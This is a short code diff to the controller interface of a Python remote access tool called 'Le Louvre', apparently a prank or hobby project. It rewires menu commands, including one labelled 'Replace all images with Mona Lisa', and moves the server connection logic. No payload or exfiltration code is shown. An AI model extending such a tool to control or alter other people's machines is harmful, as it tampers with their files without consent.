@@ -4,8 +4,7 @@ class LeLouvre:
     def __init__(self):
         self.commands = {
             "0": "Exit from RAT interface",
-            "1": "Run Server",
-            "2": "Set Mona Lisa as desktop background"
+            "1": "Replace all images with Mona Lisa"
         }
         self.client = client.Client()
 
@@ -18,6 +17,7 @@ class LeLouvre:
 
     """ Runs an interactive CLI RAT interface. """
     def run_rat_interface(self):
+        self.connect_to_server()
         while True:
             print("\n#######################\nLe Louvre RAT Interface\n#######################\n")
             for command, description in self.commands.items():
@@ -34,18 +34,18 @@ class LeLouvre:
                 return
             else:
                 self.execute_command(command_key)
+        self.disconnect_from_server()
 
     """ Executes command based on the command key provided. """
     def execute_command(self, command_key):
         # Establish server for client connection
         if command_key == "1":
-            self.connect_to_server()
             resp = self.client.message("1")
             print(resp)
-            self.disconnect_from_server()
         # TODO: Set background to Mona Lisa
         elif command_key == "2":
-            pass
+            resp = self.client.message("2")
+            print(resp)
             
 if __name__=="__main__":
     le_louvre = LeLouvre()
